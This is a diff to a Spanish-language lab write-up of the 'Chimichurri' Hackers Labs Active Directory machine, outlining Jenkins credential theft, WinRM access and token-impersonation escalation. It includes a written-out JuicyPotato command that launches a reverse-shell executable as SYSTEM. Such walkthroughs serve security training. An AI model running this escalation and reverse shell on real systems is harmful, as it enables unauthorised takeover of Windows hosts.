@@ -3,13 +3,15 @@ layout: post
 title: "Chimichurri - Hackerslabs - Windows AD"
 date: 2026-07-27
 img: /assets/img/windows/chimichurri/banner.png
-tags: [Windows, AD, crackmapexec, kerbrute, JuicyPotato, CVE-2024-23897]
+tags: [Windows, AD, crackmapexec, kerbrute, winrm, evil-winrm, JuicyPotato, CVE-2024-23897]
 ---
 
  ![](/secnotes/assets/img/windows/chimichurri/banner.png)
 
 Sistema operativo: Windows Active Directory.
 Plataforma: The Hackers Labs.
+
+En este laboratorio analizaremos el compromiso completo de la máquina Chimichurri. Comenzaremos explorando la interfaz CLI de una versión vulnerable de Jenkins para extraer credenciales en texto plano, continuaremos estableciendo una sesión interactiva por PowerShell sobre WinRM y concluiremos explotando privilegios de suplantación de tokens (SeImpersonatePrivilege) para escalar hasta SYSTEM y tomar el control del dominio chimichurri.thl.
 
 # Reconocimiento
 
@@ -21,7 +23,6 @@ Para comenzar utilizaremos la herramienta Auto-Recon. Suite de herramientas del 
 Nos encontramos frente a un Active Directory. Nos llama la atención el puerto **6969** que corresponde a un servicio web llamado **Jetty** y que aloja el archivo robots.txt
 
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260726213841.png)
-
 
 ## Enumeración SMB
 
@@ -60,7 +61,6 @@ Esta enumeración nos encontró usuarios válidos.
 Ya que tenemos usuarios del sistema, nos creamos un diccionario, y con la herramienta `impacket-GetNPUsers` validaremos si estos no requieren autenticación en kerberos.
 
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727194032.png)
-
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727194446.png)
 
 Tras esta verificación de la preautenticación de Kerberos, confirmamos que los usuarios encontrados no cuentan con el atributo `UF_DONT_REQUIRE_PREAUTH`.
@@ -105,7 +105,6 @@ con esta comprobación obtenemos 3 cosas fundamentales.
 Ahora para obtener una consola de PowerShell podemos usar `evil.winrm` usando estas credenciales.
 
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727203828.png)
-
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727204127.png)
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727204139.png)
 
@@ -125,7 +124,6 @@ Ponemos nuestro puerto 443 en escucha y ejecutamos los archivos apuntando a cmd 
 `./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 443 -a "/c C:\Users\hacker\Documents\rs.exe"`
 
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727215116.png)
-
 ![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727215021.png)
 
 En esta ocasión no fue necesario poner el **CLSID** del Sistema Operativo..
